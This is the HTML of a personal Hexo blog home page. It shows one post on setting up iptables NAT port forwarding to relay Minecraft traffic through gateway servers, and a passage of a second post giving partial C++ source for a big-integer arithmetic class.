<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 3.8.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">


<script id="hexo-configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    hostname: new URL('https://mrh1s.top').hostname,
    root: '/',
    scheme: 'Pisces',
    version: '7.7.0',
    exturl: false,
    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
    copycode: {"enable":false,"show_result":false,"style":null},
    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
    bookmark: {"enable":false,"color":"#222","save":"auto"},
    fancybox: false,
    mediumzoom: false,
    lazyload: false,
    pangu: false,
    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
    algolia: {
      appID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
    path: '',
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
  };
</script>

  <meta name="description" content="Blog">
<meta property="og:type" content="website">
<meta property="og:title" content="mrh929&#39;s home">
<meta property="og:url" content="https://mrh1s.top/index.html">
<meta property="og:site_name" content="mrh929&#39;s home">
<meta property="og:description" content="Blog">
<meta property="og:locale" content="en">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="mrh929&#39;s home">
<meta name="twitter:description" content="Blog">

<link rel="canonical" href="https://mrh1s.top/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: true,
    isPost: false
  };
</script>

  <title>mrh929's home</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">mrh929's home</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
  </div>

  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>

  </li>
  </ul>

</nav>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
    <link itemprop="mainEntityOfPage" href="https://mrh1s.top/posts/d0aeeace/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="mrh929">
      <meta itemprop="description" content="Blog">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="mrh929's home">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/posts/d0aeeace/" class="post-title-link" itemprop="url">利用iptables配置Minecraft跳板机</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-01-14 16:09:55" itemprop="dateCreated datePublished" datetime="2020-01-14T16:09:55+08:00">2020-01-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-01-19 22:46:25" itemprop="dateModified" datetime="2020-01-19T22:46:25+08:00">2020-01-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tips/" itemprop="url" rel="index">
                    <span itemprop="name">Tips</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <a id="more"></a>



<h1 id="Minecraft-Gateway-Server-Configuration"><a href="#Minecraft-Gateway-Server-Configuration" class="headerlink" title="Minecraft Gateway_Server Configuration"></a>Minecraft Gateway_Server Configuration</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><h3 id="Servers"><a href="#Servers" class="headerlink" title="Servers"></a>Servers</h3><p>搬瓦工的 <strong>CN2 GT</strong> 服务器 <strong>S1</strong>（2g 2core）</p>
<p><strong>CN2 GIA</strong> 服务器 <strong>S2</strong>（0.5g 1core）</p>
<p>阿里云服务器 <strong>S3</strong></p>
<h3 id="need"><a href="#need" class="headerlink" title="need"></a>need</h3><p>我拥有三台服务器，其中需要使用 <strong>S1</strong> 开服，但是由于<strong>线路原因</strong>，游戏丢包情况十分严重，相比之下配置较低的 <strong>cn2 gia</strong> 服务器就拥有很优质的线路，且 <strong>S2</strong> 还不够，仍然会有少许丢包，导致mc掉线，故再加上阿里云服务器 <strong>S3</strong> 进行中转，通过利用 <strong>S2</strong> 和 <strong>S3</strong> 作为跳板机对流量进行中转，便可以达到较佳的游戏体验。</p>
<h3 id="graph"><a href="#graph" class="headerlink" title="graph"></a>graph</h3><p><strong>mc客户端</strong> &lt;——&gt; <strong>阿里云</strong> S3 &lt;——&gt; <strong>cn2 gia 服务器</strong> S2 &lt;——&gt; <strong>mc服务器</strong> S1</p>
<h2 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h2><p>参考资料：<a href="http://jensd.be/343/linux/forward-a-tcp-port-to-another-ip-or-port-using-nat-with-iptables" target="_blank" rel="noopener">nat-with-iptables</a></p>
<h3 id="ip-forward"><a href="#ip-forward" class="headerlink" title="ip_forward"></a>ip_forward</h3><p>服务器的流量转发功能默认关闭，需要手动开启</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sysctl net.ipv4.ip_forward <span class="comment"># CentOS or Ubuntu</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>net.ipv4.ip_forward = 0 #表明未开启流量转发</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">echo</span> <span class="string">"net.ipv4.ip_forward = 1"</span>|sudo tee /etc/sysctl.d/99-ipforward.conf</span><br><span class="line">net.ipv4.ip_forward = 1 </span><br><span class="line"><span class="comment"># CentOS</span></span><br><span class="line"></span><br><span class="line">sudo sed -i <span class="string">'s/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g'</span> /etc/sysctl.conf</span><br><span class="line"><span class="comment"># Ubuntu</span></span><br></pre></td></tr></table></figure>

<p>便可以开启转发，但重启后会恢复，我们需要将其写入配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sysctl -p /etc/sysctl.d/99-ipforward.conf</span><br><span class="line"><span class="comment"># CentOS</span></span><br><span class="line"></span><br><span class="line">sudo sysctl -p</span><br><span class="line"><span class="comment"># Ubuntu</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>net.ipv4.ip_forward = 1 # 写入配置</p>
</blockquote>
<h3 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h3><h4 id="install-amp-start"><a href="#install-amp-start" class="headerlink" title="install &amp; start"></a>install &amp; start</h4><ol>
<li>对于 <strong>Ubuntu</strong> 系统，自带 <strong>iptables</strong></li>
<li>对于 <strong>CentOS</strong> 系统，默认安装了 <strong>firewall</strong> ，需要先将 <strong>firewall</strong> 关闭，再安装 <strong>iptables</strong> </li>
</ol>
<p>参考此文章：<a href="https://blog.csdn.net/mshxuyi/article/details/93979737" target="_blank" rel="noopener">centos如何开启iptables</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld.service <span class="comment"># 停止firewall</span></span><br><span class="line">systemctl <span class="built_in">disable</span> firewalld.service <span class="comment"># 禁止firewall开机启动</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># yum -y install iptables-services 安装iptables(有的系统不需安装，视情况而定)</span></span><br><span class="line">service iptables start <span class="comment"># 启动iptables</span></span><br></pre></td></tr></table></figure>

<h4 id="Configuration-1"><a href="#Configuration-1" class="headerlink" title="Configuration"></a>Configuration</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo iptables -F</span><br><span class="line">sudo iptables -t nat -F</span><br><span class="line"><span class="comment"># 清除iptables原有的配置文件</span></span><br></pre></td></tr></table></figure>

<p>流量转发配置</p>
<p>自行替换 <strong>Gateway_IP</strong>、<strong>Gateway_Port</strong>、<strong>Dest_IP</strong>、<strong>Dest_Port</strong></p>
<p>分别对应 跳板机的ip和端口，目标机器的ip和端口</p>
<p>这里的<strong>协议</strong>我设置为了 <strong>tcp</strong>， 根据你需要转发的协议类型进行设置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo iptables -t nat -A PREROUTING -p tcp --dport Gateway_Port -j DNAT --to-destination Dest_IP:Dest_PORT <span class="comment"># 将进入跳板机的流量转发到目标ip</span></span><br><span class="line"></span><br><span class="line">sudo iptables -t nat -A POSTROUTING -p tcp -d Dest_IP --dport Dest_Port -j SNAT --to-source Gateway_ip <span class="comment"># 将目标ip返回的流量转发给原ip</span></span><br><span class="line"></span><br><span class="line">sudo iptables -t nat -L -n <span class="comment"># 查看iptables配置情况</span></span><br></pre></td></tr></table></figure>

<p>查看配置无误之后，即完成</p>
<p>若希望保存配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service iptables save</span><br><span class="line"><span class="comment"># CentOS</span></span><br><span class="line"></span><br><span class="line">sudo iptables-save | sudo tee /etc/iptables.up.rules</span><br><span class="line"><span class="comment"># Ubuntu</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>iptables: Saving firewall rules to /etc/sysconfig/iptables:[  OK  ]</p>
</blockquote>
<h3 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h3><h4 id="1-阿里云无法转发"><a href="#1-阿里云无法转发" class="headerlink" title="1. 阿里云无法转发"></a>1. 阿里云无法转发</h4><p>阿里云采用了 <a href="http://www.360doc.com/content/18/1127/11/60700377_797529851.shtml" target="_blank" rel="noopener">弹性ip</a> 的技术， 即在你访问其公网ip之后又经过一层nat，转发到内网</p>
<p>所以我们的 <strong>iptables</strong> 配置也应该将本机ip修改为内网ip</p>
<p>这时我们的 <strong>Gateway_IP</strong> 应该填写内网ip， 即 172 . 17. * . *  （具体请自行查询）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@izuf6eyc1ac8d7lj4j6q2oz /]<span class="comment"># ifconfig</span></span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.*.*  netmask 255.255.192.0  broadcast 172.17.*.*</span><br><span class="line">        ether 00:16:3e:10:91:52  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 3528831  bytes 368948380 (351.8 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 3485951  bytes 321121112 (306.2 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        loop  txqueuelen 1  (Local Loopback)</span><br><span class="line">        RX packets 6260  bytes 392377 (383.1 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 6260  bytes 392377 (383.1 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>

<h4 id="2-多层跳板如何搭建"><a href="#2-多层跳板如何搭建" class="headerlink" title="2. 多层跳板如何搭建"></a>2. 多层跳板如何搭建</h4><p>多层跳板，就是将跳板机 <strong>src</strong> 的 <strong>目的地址</strong> 设置为下级跳板 <strong>dest</strong> ，层层中转即可</p>
<p>即配置 <strong>S1 、 S2</strong></p>
<ol>
<li><p>使 <strong>S3</strong> 中转给 <strong>S2</strong></p>
</li>
<li><p>使 <strong>S2</strong> 中转给 <strong>S1</strong></p>
</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
    <link itemprop="mainEntityOfPage" href="https://mrh1s.top/posts/ab908eac/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="mrh929">
      <meta itemprop="description" content="Blog">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="mrh929's home">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/posts/ab908eac/" class="post-title-link" itemprop="url">大整数的C++实现</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2020-01-06 12:20:31 / Modified: 12:44:19" itemprop="dateCreated datePublished" datetime="2020-01-06T12:20:31+08:00">2020-01-06</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/project/" itemprop="url" rel="index">
                    <span itemprop="name">project</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Big-Int"><a href="#Big-Int" class="headerlink" title="Big Int"></a>Big Int</h1><p>已经上传 <strong>github</strong> ：<a href="https://github.com/mrh929/BigInt" target="_blank" rel="noopener">https://github.com/mrh929/BigInt</a></p>
<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>一个用C++编写的大整数运算器，使用了类的方法以及符号重载的方式来管理各种计算符号。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">ostream &amp; <span class="keyword">operator</span> &lt;&lt; (ostream &amp;os, BigInt a);<span class="comment">//重载输出流</span></span><br><span class="line">BigInt <span class="keyword">operator</span> &lt;&lt; (BigInt a, <span class="keyword">int</span> b);<span class="comment">//以下是各种符号的符号重载</span></span><br><span class="line">BigInt <span class="keyword">operator</span> &gt;&gt; (BigInt a, <span class="keyword">int</span> b);</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &gt; (BigInt a, BigInt b);</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &gt;= (BigInt a, BigInt b);</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (BigInt a, BigInt b);</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &lt;= (BigInt a, BigInt b);</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> == (BigInt a, BigInt b);</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> != (BigInt a, BigInt b);</span><br><span class="line">BigInt <span class="keyword">operator</span> + (BigInt a, BigInt b);</span><br><span class="line">BigInt <span class="keyword">operator</span> - (BigInt a, BigInt b);</span><br><span class="line">BigInt <span class="keyword">operator</span> * (BigInt a, BigInt b);</span><br><span class="line">BigInt <span class="keyword">operator</span> / (BigInt a, BigInt b);</span><br><span class="line">BigInt <span class="keyword">operator</span> % (BigInt a, BigInt b);</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">absolute_cmp</span><span class="params">(BigInt a, BigInt b)</span></span>;<span class="comment">//绝对值比较</span></span><br><span class="line"><span class="function">BigInt <span class="title">pushup</span><span class="params">(BigInt &amp;a)</span></span>;<span class="comment">//进位函数，方便更新处理加法和乘法之后的结果</span></span><br><span class="line"><span class="function">BigInt <span class="title">pushdown</span><span class="params">(BigInt &amp;a)</span></span>;<span class="comment">//借位函数，方便更新处理减法与除法之后的前导零</span></span><br></pre></td></tr></table></figure>

<p>由于计算要满足 <strong>语义完备性</strong>， 我们可以将 <strong>＞ ＜ ＝</strong> 之类的符号只实现其中两个，另一个用前面两个符号的逻辑表达式来表示。这样可以减小算法编写量。</p>
<p>比如我的取模运算就是利用 <strong>a % b = a - (a / b * b)</strong> 的算式来进行的，目的是尽量减少重复计算的编写，避免语义重复导致代码冗杂。</p>
<p>这里的除法应用了试根法，通过不断减去除数，直到结果小于等于0，减去除数的次数便是最终的结果。 </p>
<h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p><strong>2^2048</strong> 量级</p>
<p><strong>X=</strong> 12482264789495844167952743674345192058347658696244846024506086756017404270329316853273041017249678950066348595640122013326388180800571171673805957545645811138822997641052783783643217674156834480484155675467569932624307075411108488522509264028054521773056807183216239690927306363502717731691081745037043661929912687363727319054138337027541053221928309092332845113037444417624930690136431627266175440870332546279455634900371634225967525289205393311361381052800131349877664888848787057588470069212633123461825711669157225916604667745476377157310522514234303671161858238888360921077671217358198370531988343589559604876284</p>
<p><strong>Y=</strong> 1280730864615811759821132949087528726325520041739385671708858051142109630967299023961230758400337351772390265280394429009926875184005772035344541944036323178042973490581385536990180703449459150513955554549596768053810110112451980299436720866146499950924670995962445917972409391039058909325472146973088609382932848054367560562133611270686707661165793779566207985413463940767202953610885199897580866376092558784820762217980107705915440804143477818053671563647690424246811327119924020088286709086413582886779320723275600807886717409943439676762548169766661227661132724874836952052156168392209434986629771081555443608284</p>
<p><strong>m=</strong> 26276671267336699549929786692210641894085878508699738341408482869283000463006609816748150758887020789500336306584836616160250372409642949310833789547133401665674848173946416217142121019602682188968147765629440590913830497348564644309060269315465932613732738758615722069669745219203052852800610504371627718589337502423268449548364104210930215810677840459085169776897907731873142754299180658298179972639899398242262850797386228967175906205170668840014770506566561161713676741346132712253755150416478986782691455647303372766626483759402251334751219513662706582839143768502897185844861757936312109408176137579367017788106</p>
<p><strong>还是能在六分钟之内跑出来。</strong></p>
<p>（主要是除法用了试根法，导致计算时间大大增长）</p>
<p><img src="https://i.loli.net/2020/01/06/1dWaGrS7UMRhE9B.png" alt="1.png"></p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> Digit_Per_Num = <span class="number">1</span>;</span><br><span class="line"><span class="comment">//digits to be stored into an int(accept range:(1-2));</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BigInt</span>&#123;</span></span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="keyword">int</span> num[<span class="number">1000</span>]; <span class="comment">// both int and longlong are valid</span></span><br><span class="line">		<span class="keyword">int</span> n;</span><br><span class="line">		<span class="keyword">int</span> neg;<span class="comment">// is it a negative number</span></span><br><span class="line">		BigInt()&#123;</span><br><span class="line">			<span class="keyword">this</span>-&gt;n = <span class="keyword">this</span>-&gt;neg = <span class="keyword">this</span>-&gt;num[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		BigInt(<span class="built_in">string</span>);</span><br><span class="line">		BigInt <span class="keyword">operator</span> -()&#123;</span><br><span class="line">			<span class="keyword">this</span>-&gt;neg ^= <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="built_in">string</span> <span class="title">to_binary_string</span><span class="params">()</span></span>;</span><br><span class="line">		</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ostream &amp; <span class="keyword">operator</span> &lt;&lt; (ostream &amp;os, BigInt a);</span><br><span class="line">BigInt <span class="keyword">operator</span> &lt;&lt; (BigInt a, <span class="keyword">int</span> b);</span><br><span class="line">BigInt <span class="keyword">operator</span> &gt;&gt; (BigInt a, <span class="keyword">int</span> b);</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &gt; (BigInt a, BigInt b);</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &gt;= (BigInt a, BigInt b);</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (BigInt a, BigInt b);</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &lt;= (BigInt a, BigInt b);</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> == (BigInt a, BigInt b);</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> != (BigInt a, BigInt b);</span><br><span class="line">BigInt <span class="keyword">operator</span> + (BigInt a, BigInt b);</span><br><span class="line">BigInt <span class="keyword">operator</span> - (BigInt a, BigInt b);</span><br><span class="line">BigInt <span class="keyword">operator</span> * (BigInt a, BigInt b);</span><br><span class="line">BigInt <span class="keyword">operator</span> / (BigInt a, BigInt b);</span><br><span class="line">BigInt <span class="keyword">operator</span> % (BigInt a, BigInt b);</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">absolute_cmp</span><span class="params">(BigInt a, BigInt b)</span></span>;</span><br><span class="line"><span class="function">BigInt <span class="title">pushup</span><span class="params">(BigInt &amp;a)</span></span>;</span><br><span class="line"><span class="function">BigInt <span class="title">pushdown</span><span class="params">(BigInt &amp;a)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BigInt::BigInt(<span class="built_in">string</span> s)&#123;</span><br><span class="line">	<span class="keyword">if</span>(s.substr(<span class="number">0</span>,<span class="number">1</span>).c_str()[<span class="number">0</span>] == <span class="string">'-'</span>)&#123;</span><br><span class="line">		s = s.substr(<span class="number">1</span>);</span><br><span class="line">		neg = <span class="number">1</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span> neg = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span>(s.substr(<span class="number">0</span>,<span class="number">1</span>).c_str()[<span class="number">0</span>] == <span class="string">'0'</span>)</span><br><span class="line">		s = s.substr(<span class="number">1</span>);</span><br><span class="line">	<span class="comment">// to cut off leading zero</span></span><br><span class="line">		</span><br><span class="line">	<span class="keyword">this</span>-&gt;n = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(s.size() &gt;= Digit_Per_Num+<span class="number">1</span>)&#123;</span><br><span class="line">			<span class="keyword">this</span>-&gt;num[<span class="keyword">this</span>-&gt;n++] = atoi(s.substr(s.size() - Digit_Per_Num).c_str());</span><br><span class="line">			s = s.substr(<span class="number">0</span>, s.size() - Digit_Per_Num);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">this</span>-&gt;num[<span class="keyword">this</span>-&gt;n] = atoi(s.c_str());</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	pushup(*<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span> BigInt::to_binary_string()&#123;</span><br><span class="line">	<span class="built_in">string</span> out;</span><br><span class="line">	BigInt temp = *<span class="keyword">this</span>;</span><br><span class="line">	BigInt t;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> neg = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(temp &lt; BigInt(<span class="string">"0"</span>))</span><br><span class="line">		neg = <span class="number">1</span>;</span><br><span class="line">	temp.neg = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span>(temp != BigInt(<span class="string">"0"</span>))&#123;</span><br><span class="line">		t = temp % BigInt(<span class="string">"2"</span>);</span><br><span class="line">		<span class="keyword">if</span>(t.num[<span class="number">0</span>] == <span class="number">1</span>)</span><br><span class="line">			out = <span class="string">"1"</span> + out;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			out = <span class="string">"0"</span> + out;</span><br><span class="line">		temp = temp / BigInt(<span class="string">"2"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(neg)</span><br><span class="line">		out = <span class="string">"-"</span> + out;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ostream &amp; <span class="keyword">operator</span> &lt;&lt; (ostream &amp;os, BigInt a)&#123;</span><br><span class="line">	<span class="keyword">if</span>(a.neg)</span><br><span class="line">		os &lt;&lt; <span class="string">"-"</span>;</span><br><span class="line">	<span class="comment">// os &lt;&lt; a.neg? "-":" ";</span></span><br><span class="line">	<span class="comment">// negative operator</span></span><br><span class="line">	</span><br><span class="line">	os &lt;&lt; a.num[a.n];</span><br><span class="line">	<span class="comment">// the first one digit has no leading zero</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = a.n<span class="number">-1</span>; i+<span class="number">1</span>; i--)</span><br><span class="line">		os &lt;&lt; setfill(<span class="string">'0'</span>) &lt;&lt; setw(Digit_Per_Num) &lt;&lt; a.num[i];</span><br><span class="line">		<span class="comment">// add leading zero(s)</span></span><br><span class="line">	os &lt;&lt; <span class="string">""</span>; <span class="comment">// I don't know why this must be put here;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BigInt <span class="keyword">operator</span> + (BigInt a, BigInt b)&#123;</span><br><span class="line">	<span class="function">BigInt <span class="title">BI</span><span class="params">(<span class="string">"0"</span>)</span></span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// if one is below 0 and the other is above 0, then sub them</span></span><br><span class="line">	<span class="keyword">if</span>(a.neg != b.neg)&#123;</span><br><span class="line">		b = -b;</span><br><span class="line">		<span class="keyword">return</span> a - b;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	BI.neg = a.neg;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">int</span> mod = <span class="built_in">pow</span>(<span class="number">10</span>, Digit_Per_Num);</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>, flag = <span class="number">0</span>, ci = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(a.n &gt;= i || b.n &gt;= i || flag)&#123;</span><br><span class="line">		flag = <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">if</span>(a.n &lt; i) a.num[i] = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span>(b.n &lt; i) b.num[i] = <span class="number">0</span>;</span><br><span class="line">		</span><br><span class="line">		BI.num[i] = a.num[i] + b.num[i] + ci;</span><br><span class="line">		ci = BI.num[i] / mod;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(ci)<span class="comment">//carry</span></span><br><span class="line">			flag = <span class="literal">true</span>;</span><br><span class="line">		BI.num[i] %= mod;</span><br><span class="line">		BI.n = i++;</span><br><span class="line">	&#125;</span><br><span class="line">	pushup(BI);</span><br><span class="line">	<span class="keyword">return</span> BI;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 